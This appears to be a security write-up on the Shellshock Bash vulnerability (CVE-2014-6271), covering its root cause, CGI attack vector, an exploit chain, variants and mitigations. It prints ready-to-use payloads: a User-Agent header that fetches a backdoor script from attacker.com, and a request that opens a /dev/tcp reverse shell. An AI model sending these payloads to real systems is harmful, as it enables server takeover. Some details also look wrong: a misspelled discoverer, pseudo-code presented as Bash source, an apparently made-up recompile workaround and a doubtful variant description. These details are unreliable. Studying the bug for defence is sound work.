# Shellshock (CVE-2014-6271)

## Classification
- **CVE**: CVE-2014-6271 (primary), CVE-2014-7169, CVE-2014-7186, CVE-2014-7187, CVE-2014-6277, CVE-2014-6278
- **CVSS 3.0**: 9.8 (Critical)
- **Type**: Bash Shell Function Definition Injection — Remote Code Execution
- **Affected**: Bash versions 1.14 through 4.3 (released 1989-2014) — 25 years of code
- **Discoverer**: Stephane Chazelass (Akamai), Florian Weimer (Red Hat), Tavis Ormandy (Google)
- **Wild Impact**: ~500M systems affected, massive scanning/exploitation within 24 hours

## Root Cause

Bash allows functions to be exported via environment variables. Function definitions look like:
```bash
export myfunction='() { echo "hello"; }'
```
The bug: Bash does not stop parsing after the function body. If the string after the function definition contains additional code, Bash **executes it** during environment variable import.

```bash
# A function definition:
env x='() { :;}; echo VULNERABLE' bash -c "echo this is a test"
#                                    ↑↑↑↑↑↑↑↑↑↑
#                                    This code executes during import!
```

**The vulnerable code** in `variables.c`:
```c
// When Bash imports a function from an environment variable
// It looks for '() {' at the start of the value
// Then it executes the value as a function definition
// BUT: it doesn't stop after the function body!

if (strncmp(string, "() {", 4) == 0) {
    // Parse and define the function
    // Then... it continues parsing the value
    // Any code AFTER the function body is also evaluated!
}
```

### The Real-World Vector: CGI

Apache's `mod_cgi` passes HTTP headers as environment variables:
```
User-Agent: () { :;}; /bin/bash -c 'wget http://attacker.com/backdoor.sh'
```
Becomes:
```
HTTP_USER_AGENT=() { :;}; /bin/bash -c 'wget http://attacker.com/backdoor.sh'
```
When Bash runs the CGI script and reads this env var → **Code Execution**.

## Exploit Chain

1. **Identify target**: Any CGI script on a web server using Bash
2. **Inject payload**:
   ```
   GET /cgi-bin/test.cgi HTTP/1.1
   Host: victim.com
   User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
   ```
3. **Server processes request**: Apache runs CGI, Bash interprets env vars
4. **Shellcode executes**: Reverse shell back to attacker
5. **Full compromise**: Attacker has shell at web server privilege level

## Why Shellshock Is Legendary

- **25-year-old bug**: Written in 1989, found in 2014 — the code predates Linux itself
- **CGI was everywhere**: Every web server with CGI was vulnerable
- **DHCP clients**: DHCP environment variables passed to Bash triggered the bug
- **SSH ForceCommand**: SSH restricted shell bypass via environment variable
- **SIP phones**: Many embedded systems had Bash and CGI

## Pattern Recognition

1. **Parser state confusion**: When a parser function intended for one purpose (function definitions) is used for parsing user data (environment variables), confusion between "this is the format string" and "this is data" causes bugs (similar to printf format string bugs)
2. **Environment variable injection**: Any process that accepts env vars and invokes Bash is vulnerable — CGI, DHCP, SSH, cron
3. **Function definition → code execution**: The specific pattern: starting a string with `() {` triggers Bash function parsing, and the parser doesn't properly terminate
4. **Post-body execution**: The parser incorrectly continues executing code after the expected logical endpoint

## Variants
| CVE | Description |
|-----|-------------|
| CVE-2014-7169 | Parse error leads to out-of-bounds memory access / file creation |
| CVE-2014-7186 | `redir_stack` overflow via crafted `<<EOF` |
| CVE-2014-7187 | Off-by-one error in nested `here-doc` handling |
| CVE-2014-6277 | `fatalf` function handler vulnerability |
| CVE-2014-6278 | ShellShock 2 — secondary parsing bug after initial patch |

## Mitigation Status
- **Patch**: Bash 4.3 patch level 25+ (Sept 2014)
- **Workaround**: Recompile with `-DSHELLSHOCK_PATCH`
- **Long-term**: Replace CGI with faster/more secure (FastCGI, WSGI)
- **2026 status**: Shodan still shows thousands of shellshock-vulnerable devices; embedded systems are the worst offenders

## PoC & References
- **Original PoC**: gist.github.com (multiple by various researchers)
- **Mass scanner**: github.com/nccgroup/shocker (Shellshock scanner)
- **Exploit-DB**: Multiple entries for CGI-based exploitation
- **Cloudflare**: Protect against Shellshock with WAF rules
- **Pentest-Tools**: "How These Vulnerabilities Pushed Offensive Security Forward" (2025 retrospective)
- **Still finding targets 10 years later**: Shellshock is still a top vulnerability on penetration tests and bug bounty programs
